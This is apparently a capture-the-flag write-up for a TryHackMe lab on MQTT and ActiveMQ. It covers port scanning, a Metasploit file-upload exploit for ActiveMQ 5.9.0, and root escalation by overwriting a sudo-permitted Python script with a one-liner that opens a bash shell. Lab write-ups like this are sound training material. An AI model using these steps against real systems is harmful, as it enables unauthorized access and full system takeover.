# URL
https://tryhackme.com/room/broker
# Concept
* MQTT pentesting
# Method of solve
## Q1 - Do a TCP portscan on all ports with port number greater than 1000 and smaller than 10000! Which TCP ports do you find to be open? (counting up)
* with nmap we find the ports `1883` and `8163`
## Q2 - What is the name of the software they use?
* when we visit the webpage on port `8163` we see `ActiveMQ` being used
## Q3 - Which videogame are Paul and Max talking about?
* the version of `ActiveMQ` is vulnerable to a Metasploit hacking script
```
searchsploit activemq 5.9.0
```
* fire up `msfconsole`
```
msfconsole
use exploit/multi/http/apache_activemq_upload_jsp
```
## Q4 - Which videogame are Paul and Max talking about?
* once we have a terminal session on the box, open up `chat.py`
## Privilege Escalation
* our user has certain sudo permissions:
```
User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```
* it turns out that we have write permissions on this script, `subscribe.py`
* that means we just need to overwrite the contents of that file with some shell-opening Python code:
```
echo 'import os;os.system("/bin/bash -i")' > subscribe.py
```


